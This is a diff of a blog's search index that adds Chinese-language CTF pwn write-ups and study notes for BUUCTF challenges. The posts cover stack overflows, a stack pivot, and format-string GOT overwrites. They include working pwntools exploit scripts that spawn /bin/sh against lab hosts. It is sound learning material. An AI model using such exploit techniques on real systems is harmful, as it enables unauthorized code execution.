@@ -359,7 +359,7 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-string">&quot;25172&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x40</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x000000000040060D</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041127242.png" alt="image-20241204112719202"></p>
-<h3 id="4-ciscn-2019-n-1"><a href="#4-ciscn-2019-n-1" class="headerlink" title="4.ciscn_2019_n_1"></a>4.ciscn_2019_n_1</h3><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041247391.png" alt="image-20241204124756352"></p>
+<h3 id="4-ciscn-2019-n-1"><a href="#4-ciscn-2019-n-1" class="headerlink" title="*4.ciscn_2019_n_1"></a>*4.ciscn_2019_n_1</h3><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041247391.png" alt="image-20241204124756352"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041134458.png" alt="image-20241204113446414"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041134328.png" alt="image-20241204113459274"></p>
 <p>①：</p>
@@ -379,13 +379,16 @@
 <p>3.直接转：</p>
 <p>双击dword_4007F4直接跳转到</p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412050043024.png" alt="image-20241205004307855"></p>
-<h3 id="5-pwn1-sctf-2016"><a href="#5-pwn1-sctf-2016" class="headerlink" title="5.pwn1_sctf_2016"></a>5.pwn1_sctf_2016</h3><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041238965.png" alt="image-20241204123847897"></p>
+<h3 id="5-pwn1-sctf-2016"><a href="#5-pwn1-sctf-2016" class="headerlink" title="*5.pwn1_sctf_2016"></a>*5.pwn1_sctf_2016</h3><p>32位——转换</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041238965.png" alt="image-20241204123847897"></p>
 <p>分析这段代码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> vuln()<br>&#123;<br>  const char *v0; // eax<br>  char s[<span class="hljs-number">32</span>]; // [esp+1Ch] [ebp-3Ch] BYREF<br>  char v3[<span class="hljs-number">4</span>]; // [esp+3Ch] [ebp-1Ch] BYREF<br>  char v4[<span class="hljs-number">7</span>]; // [esp+40h] [ebp-18h] BYREF<br>  char v5; // [esp+47h] [ebp-11h] BYREF<br>  char v6[<span class="hljs-number">7</span>]; // [esp+48h] [ebp-10h] BYREF<br>  char v7[<span class="hljs-number">5</span>]; // [esp+4Fh] [ebp-9h] BYREF<br><br>  printf(<span class="hljs-string">&quot;Tell me something about yourself: &quot;</span>);<br>  fgets(s, <span class="hljs-number">32</span>, edata);<br>  std::string::operator=(&amp;<span class="hljs-built_in">input</span>, s);<br>  std::allocator&lt;char&gt;::allocator(&amp;v5);<br>  std::string::string(v4, <span class="hljs-string">&quot;you&quot;</span>, &amp;v5);<br>  std::allocator&lt;char&gt;::allocator(v7);<br>  std::string::string(v6, <span class="hljs-string">&quot;I&quot;</span>, v7);<br>  replace((std::string *)v3);             <span class="hljs-comment">#</span><br>  std::string::operator=(&amp;<span class="hljs-built_in">input</span>, v3, v6, v4);<br>  std::string::~string(v3);<br>  std::string::~string(v6);<br>  std::allocator&lt;char&gt;::~allocator(v7);<br>  std::string::~string(v4);<br>  std::allocator&lt;char&gt;::~allocator(&amp;v5);<br>  v0 = (const char *)std::string::c_str((std::string *)&amp;<span class="hljs-built_in">input</span>);<br>  strcpy(s, v0);<br>  <span class="hljs-keyword">return</span> printf(<span class="hljs-string">&quot;So, %s\n&quot;</span>, s);<br></code></pre></td></tr></table></figure>
+
 <p>定义的变量s据栈地3C（60），但是看fgets函数只填入了32个，没有办法栈溢出了；</p>
 <p>但是看下面有个I,you</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">replace((std::string *)v3);<br></code></pre></td></tr></table></figure>
 
-<p>妹子不理解，但是通过查看wp，了解到是将I换成了you，即一个字节转成了3个字节，这样就可以进行栈溢出了</p>
+<p>将I换成了you，即一个字节转成了3个字节，这样就可以进行栈溢出了</p>
 <p>（又查看wp，发现可以先猜测一下，他是将I换成了you，然后跑一下，看看：</p>
 <p>{【打开终端，输入：.&#x2F;文件名】</p>
 <p>enter后显示： tell me something about yourself:</p>
@@ -400,7 +403,7 @@
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041430248.png" alt="image-20241204143053201"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041423503.png" alt="image-20241204142330451"></p>
 <h3 id="6-jarvisoj-level0"><a href="#6-jarvisoj-level0" class="headerlink" title="6.jarvisoj_level0"></a>6.jarvisoj_level0</h3><p>(本题涉及栈溢出，栈不平衡)</p>
-<p>首先查看main函数，没什么好看的，点开func（）</p>
+<p>首先查看main函数，然后点开func（）</p>
 <p>发现read()函数</p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041520500.png" alt="image-20241204152005447"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041521576.png" alt="image-20241204152136510"></p>
@@ -412,11 +415,12 @@
 
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041519892.png" alt="image-20241204151901820"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041530974.png" alt="image-20241204153020897"></p>
-<h2 id="7-第五空间2019-决赛-PWN5——未处理"><a href="#7-第五空间2019-决赛-PWN5——未处理" class="headerlink" title="7.[第五空间2019 决赛]PWN5——未处理"></a>7.[第五空间2019 决赛]PWN5——未处理</h2><p>考察格式化字符串漏洞</p>
+<h3 id="7-第五空间2019-决赛-PWN5——未处理"><a href="#7-第五空间2019-决赛-PWN5——未处理" class="headerlink" title="7.[第五空间2019 决赛]PWN5——未处理"></a>7.[第五空间2019 决赛]PWN5——未处理</h3><p>考察格式化字符串漏洞</p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041536582.png" alt="image-20241204153640514"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412042041277.png" alt="image-20241204204135165"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412042050030.png" alt="image-20241204205037946"></p>
-<h3 id="8-ciscn-2019-n-8"><a href="#8-ciscn-2019-n-8" class="headerlink" title="8.ciscn_2019_n_8"></a>8.ciscn_2019_n_8</h3><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>die</p>
+<h3 id="8-ciscn-2019-n-8"><a href="#8-ciscn-2019-n-8" class="headerlink" title="*8.ciscn_2019_n_8"></a>*8.ciscn_2019_n_8</h3><p>level2</p>
+<p>die</p>
 <p>反汇编查看：</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [esp-14h] [ebp-20h]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp-10h] [ebp-1Ch]</span><br><br>  var[<span class="hljs-number">13</span>] = <span class="hljs-number">0</span>;<br>  var[<span class="hljs-number">14</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">init</span>();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What&#x27;s your name?&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, var, v4, v5);<br>  <span class="hljs-keyword">if</span> ( *(_QWORD *)&amp;var[<span class="hljs-number">13</span>] )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( *(_QWORD *)&amp;var[<span class="hljs-number">13</span>] == <span class="hljs-number">17LL</span> )          <span class="hljs-comment">//如果var中的第14个数为17，进入</span><br>      <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);                        <span class="hljs-comment">//找到system</span><br>    <span class="hljs-keyword">else</span><br>      <span class="hljs-built_in">printf</span>(<br>        <span class="hljs-string">&quot;something wrong! val is %d&quot;</span>,<br>        var[<span class="hljs-number">0</span>],<br>        var[<span class="hljs-number">1</span>],<br>        var[<span class="hljs-number">2</span>],<br>        var[<span class="hljs-number">3</span>],<br>        var[<span class="hljs-number">4</span>],<br>        var[<span class="hljs-number">5</span>],<br>        var[<span class="hljs-number">6</span>],<br>        var[<span class="hljs-number">7</span>],<br>        var[<span class="hljs-number">8</span>],<br>        var[<span class="hljs-number">9</span>],<br>        var[<span class="hljs-number">10</span>],<br>        var[<span class="hljs-number">11</span>],<br>        var[<span class="hljs-number">12</span>],<br>        var[<span class="hljs-number">13</span>],<br>        var[<span class="hljs-number">14</span>]);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s, Welcome!\n&quot;</span>, var);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Try do something~&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
 
@@ -924,6 +928,136 @@
 <p>exp:</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p=process(<span class="hljs-string">&#x27;./ciscn_2019_es_2&#x27;</span>)<br><br>elf=ELF(<span class="hljs-string">&#x27;./ciscn_2019_es_2&#x27;</span>)<br>leave_ret=<span class="hljs-number">0x080484b8</span><br><br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x26</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">2</span><br>p.send(payload1)<br>p.recvuntil(<span class="hljs-string">&#x27;aabb&#x27;</span>)<br>ebp=u32(p.recv(<span class="hljs-number">4</span>))<br><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p32(elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>])+p32(<span class="hljs-number">0</span>)+p32(ebp-<span class="hljs-number">0x28</span>)+<span class="hljs-string">b&#x27;/bin/sh&#x27;</span><br>payload2=payload2.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload2+=p32(ebp-<span class="hljs-number">0x38</span>)+p32(leave_ret)<br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure>
 
+]]></content>
+  </entry>
+  <entry>
+    <title>琐碎点</title>
+    <url>/2025/03/19/%E7%90%90%E7%A2%8E%E7%82%B9/</url>
+    <content><![CDATA[<ul>
+<li><p>sendline&amp;send</p>
+<ul>
+<li>sendline和send的区别在于sendline会在发送的末尾自动加上”\n”，即发送内容为par1+”\n”。比如，send（”hello world”）表示向进程发送”hello world”字符串；sendline（”hello world”）表示向进程发送”hello world\n”，即多发送一个回车符。</li>
+</ul>
+</li>
+<li><p>recv（n）表示这个进程接收n字节的数据，recvuntil（par1）表示接收<br>到par1就停止。两个函数的返回值都为接收到的数据。</p>
+<p>1.题目：</p>
+</li>
+</ul>
+<p>buu：ciscn_2019_n_1</p>
+<p>直接改变v2的数值：</p>
+<p>疑问：</p>
+<p>为什么offset</p>
+<p>0x30-4</p>
+<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> pwn import *<br><br>r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29337</span>)<br><br><span class="hljs-built_in">offset</span> = <span class="hljs-number">0x30</span> <span class="hljs-number">-0x4</span><br>payload = <span class="hljs-built_in">offset</span>*<span class="hljs-string">&#x27;a&#x27;</span> + p64(<span class="hljs-number">0x41348000</span>)<br><span class="hljs-comment">#利用gets函数不限制输入多少，先填充v1，然后v2 = 11.28125.</span><br><span class="hljs-comment">#这里的11.28125要转换成16进制，这个可以在IDA里找到。</span><br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="read函数："><a href="#read函数：" class="headerlink" title="read函数："></a>read函数：</h2><p>read(a,b,c)</p>
+<p><code>read(int fd, void *buf, size_t count)</code> 函数用于从文件描述符 <code>fd</code> 中读取数据</p>
+<ol>
+<li><strong><code>a</code> (fd)</strong>:<ul>
+<li><strong>类型</strong>: <code>int</code></li>
+<li><strong>描述</strong>: 这是文件描述符，表示打开的文件或设备的标识符。通常通过 <code>open()</code> 函数获得。文件描述符是一个非负整数，它指向系统中的文件或设备资源。</li>
+</ul>
+</li>
+<li><strong><code>b</code> (buf)</strong>:<ul>
+<li><strong>类型</strong>: <code>void *</code></li>
+<li><strong>描述</strong>: 这是一个指针，指向一个内存缓冲区，用于存放从文件中读取的数据。在调用 <code>read</code> 时，必须确保这个缓冲区有足够的空间来存储即将读取的数据。</li>
+</ul>
+</li>
+<li><strong><code>c</code> (count)</strong>:<ul>
+<li><strong>类型</strong>: <code>size_t</code></li>
+<li><strong>描述</strong>: 这是要读取的字节数，表示希望从文件中读取多少字节。<code>count</code> 的值应该小于等于缓冲区的大小，以避免内存溢出。</li>
+</ul>
+</li>
+</ol>
+<h2 id="随机数"><a href="#随机数" class="headerlink" title="随机数"></a>随机数</h2><ol>
+<li>随机数生成：</li>
+</ol>
+<figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">fd</span> = open(<span class="hljs-string">&quot;/dev/urandom&quot;</span>, <span class="hljs-number">0</span>)<span class="hljs-comment">;  </span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p><code>open</code> 函数用于打开一个文件，并返回一个文件描述符 <code>fd</code>。</p>
+</li>
+<li><p><code>/dev/urandom</code> 是一个特殊的文件，在 Linux 等类 Unix 系统中，用于提供伪随机数生成器。它可以被用来读取随机字节，适合需要随机数的应用。</p>
+</li>
+<li><p><code>0</code> 是标志参数，表示以只读模式打开文件。</p>
+<p>2.读取随机数:</p>
+</li>
+</ul>
+<figure class="highlight lisp"><table><tr><td class="code"><pre><code class="hljs lisp">read(<span class="hljs-name">fd</span>, <span class="hljs-symbol">&amp;dword_804C044</span>, <span class="hljs-number">4</span>u)<span class="hljs-comment">;  </span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>read</code> 函数用于从文件描述符 <code>fd</code> 中读取数据。</li>
+<li><code>&amp;dword_804C044</code> 是目标缓冲区，表示要将读取的随机字节存储到名为 <code>dword_804C044</code> 的变量中（假设这是一个全局或静态变量）。</li>
+<li><code>4u</code> 表示读取 4 个字节。这里的 <code>u</code> 表示这是一个无符号整数常量。</li>
+</ul>
+<h2 id="格式化漏洞："><a href="#格式化漏洞：" class="headerlink" title="格式化漏洞："></a>格式化漏洞：</h2><p>程序将用户输入的字符误认为是格式化字符串</p>
+<p>例如：</p>
+<p>用户输入了：%x，目的是将%s打印出来，但程序误认为其为格式化字符串，就会打印出其内存相应位置的值，而不是输出：%s</p>
+<p>标志：将用户的输入直接输出：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">fgets(user_input, <span class="hljs-keyword">sizeof</span>(user_input), <span class="hljs-built_in">stdin</span>);  <span class="hljs-comment">// 从用户那里安全地读取输入  </span><br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, user_input);  <span class="hljs-comment">// 安全的打印方式  </span><br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">fgets(user_input, <span class="hljs-keyword">sizeof</span>(user_input), <span class="hljs-built_in">stdin</span>);  <span class="hljs-comment">// 从用户那里读取输入  </span><br>   <span class="hljs-built_in">printf</span>(user_input);  <span class="hljs-comment">// 不安全的打印方式  </span><br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight haml"><table><tr><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">d</span></span>：<br>用途：输出有符号十进制整数。<br>风险：如果格式化字符串中有用户输入，并且没有进行验证，可能导致错误输出或程序崩溃。<br><span class="hljs-tag">%<span class="hljs-selector-tag">u</span></span>：<br>用途：输出无符号十进制整数。<br>风险：类似于 %d，如果使用不当，也可能导致未定义行为。<br><span class="hljs-tag">%<span class="hljs-selector-tag">f</span></span>：<br>用途：输出浮点数。<br>风险：如果格式化字符串包含不正确的参数，例如没有浮点数与之对应，则可能导致程序崩溃。<br><span class="hljs-tag"></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">p</span></span>：<br>用途：输出指针的地址（通常显示为十六进制格式）。<br>风险：将用户输入直接作为指针(例如，直接显示 printf(user_input))，可能会导致信息泄露或未定义行为，尤其是泄露敏感内存地址。<br><span class="hljs-tag"></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">s</span></span>：<br>用途：输出字符串。<br>风险：如果输入的字符串包含格式化符号（例如 %），可能会导致程序尝试解释这些符号为格式指令。更严重的是，如果输入的字符串没有以 \0 结尾，也可能导致缓冲区溢出。<br><span class="hljs-tag"></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">x</span></span> 和 %X：<br>用途：输出无符号整数的十六进制表示。<br>风险：如果用户输入的格式化字符串中包含这些符号，程序会尝试从栈中读取数据，可能导致泄露内存中的敏感信息（如密码等）。<br><span class="hljs-tag"></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">n</span></span>：<br>用途：将当前输出的字符数量存储到提供的整数指针中。<br>风险：这是一个特别危险的格式说明符，因为它会直接修改内存。如果攻击者能够控制指针的值，可能会导致严重的漏洞，包括代码执行。<br></code></pre></td></tr></table></figure>
+
+<p>我们格式化字符串漏洞利用中，常用%p来泄露地址，使用%n来实现向指定地址写入数据（4字节），我们还通常会使用%hn（2字节），%hhn（1字节），%lln（8字节）进行写入</p>
+<h2 id="利用fmtstr-payload修改任意内容"><a href="#利用fmtstr-payload修改任意内容" class="headerlink" title="利用fmtstr_payload修改任意内容"></a>利用fmtstr_payload修改任意内容</h2><figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">fmtstr_payload</span><span class="hljs-params">(offset, &#123;printf_got: system_addr&#125;)</span></span><br></code></pre></td></tr></table></figure>
+
+<p>(偏移，{原地址：目的地址})</p>
+<p>fmtstr_payload(offset, writes, numbwritten&#x3D;0, write_size&#x3D;‘byte’)<br>第一个参数表示格式化字符串的偏移；<br>第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成{printfGOT:<br>systemAddress}；本题是将0804a048处改为0x2223322<br>第三个参数表示已经输出的字符个数，这里没有，为0，采用默认值即可；<br>第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。<br>fmtstr_payload函数返回的就是payload</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = process(&quot;./pwn&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25068</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>atoi_got = elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br><br>system_plt = elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>payload=fmtstr_payload(<span class="hljs-number">10</span>,&#123;atoi_got:system_plt&#125;)<br>p.sendline(payload)<br>p.sendline(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="fgets函数："><a href="#fgets函数：" class="headerlink" title="fgets函数："></a>fgets函数：</h2><p><code>fgets</code> 函数是 C 标准库中的一个输入函数，用于从指定的文件流中读取一行文本。它特别适合读取字符串输入，因为它可以有效地处理换行符和缓冲区溢出的问题。</p>
+<figure class="highlight arduino"><table><tr><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">char</span> *<span class="hljs-title">fgets</span><span class="hljs-params">(<span class="hljs-type">char</span> *str, <span class="hljs-type">int</span> n, FILE *stream)</span></span>;  <br></code></pre></td></tr></table></figure>
+
+<ol>
+<li><strong><code>char \*str</code></strong>:<ul>
+<li>指向一个字符数组，<code>fgets</code> 将把读取到的字符串存储在这个数组中。</li>
+</ul>
+</li>
+<li><strong><code>int n</code></strong>:<ul>
+<li>表示要读取的最大字符数（包括终止的空字符 <code>\0</code>）。换句话说，<code>fgets</code> 最多会读取 <code>n-1</code> 个字符，然后在字符串末尾添加一个 null 字符。</li>
+</ul>
+</li>
+<li><strong><code>FILE \*stream</code></strong>:<ul>
+<li>指向一个 <code>FILE</code> 对象，指定要读取的输入流。这个流可以是标准输入（通常是键盘<code>stdin</code>）、文件或者其他输入流。</li>
+</ul>
+</li>
+</ol>
+<p>返回值</p>
+<ul>
+<li>如果成功，<code>fgets</code> 返回指向 <code>str</code> 的指针。</li>
+<li>如果遇到文件结束符 (EOF) 或发生错误而没有读取任何字符，则返回 <code>NULL</code>。</li>
+</ul>
+<p>特点</p>
+<ul>
+<li><code>fgets</code> 会读取直到遇到换行符（<code>\n</code>）、文件结束符 (EOF) 或达到指定的字符限制（<code>n-1</code>）为止。</li>
+<li>它会保留换行符。如果读取的行包含换行符，换行符会被存储在 <code>str</code> 中（即，返回的字符串将以换行符结尾）。</li>
+<li><code>fgets</code> 会自动添加一个 null 字符 ( <code>\0</code> ) 以标识字符串的结束。</li>
+</ul>
+<p>使用示例</p>
+<p>下面是一个简单的示例，展示如何使用 <code>fgets</code> 从标准输入读取字符串：</p>
+<figure class="highlight arduino"><table><tr><td class="code"><pre><code class="hljs arduino">c<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;  <br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">100</span>];  <br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter a string: &quot;</span>);  <br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fgets</span>(buffer, <span class="hljs-built_in">sizeof</span>(buffer), stdin) != <span class="hljs-literal">NULL</span>) &#123;  <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You entered: %s&quot;</span>, buffer);  <br>    &#125; <span class="hljs-keyword">else</span> &#123;  <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error reading input.&quot;</span>);  <br>    &#125;  <br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <br>&#125;  <br></code></pre></td></tr></table></figure>
+
+<p>输出示例</p>
+<p>如果用户输入 <code>Hello, World!</code>，程序将输出：</p>
+<figure class="highlight erlang-repl"><table><tr><td class="code"><pre><code class="hljs erlang-repl">You entered: Hello, World!  <br></code></pre></td></tr></table></figure>
+
+<p>注意事项</p>
+<ul>
+<li><strong>缓冲区溢出</strong>：由于 <code>fgets</code> 会限制读取的字符数，所以它比使用 <code>gets</code>（已废弃）更安全，后者不检查缓冲区溢出。</li>
+<li><strong>换行符处理</strong>：如果你希望去除输入中的换行符，可以在读取之后手动处理，如使用 <code>strcspn</code> 函数查找并替换换行符。</li>
+</ul>
 ]]></content>
   </entry>
 </search>
